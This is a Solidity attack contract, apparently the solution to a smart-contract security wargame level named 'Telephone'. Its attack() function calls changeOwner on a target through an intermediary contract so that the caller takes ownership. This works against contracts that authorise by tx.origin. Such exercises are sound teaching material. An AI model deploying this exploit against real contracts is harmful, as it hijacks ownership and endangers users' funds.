// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    address public telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = _telephoneContract;
    }

    function attack() public {
        (bool isSuccessful, ) = telephoneContract.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );
        require(isSuccessful, "call failed");
    }
}
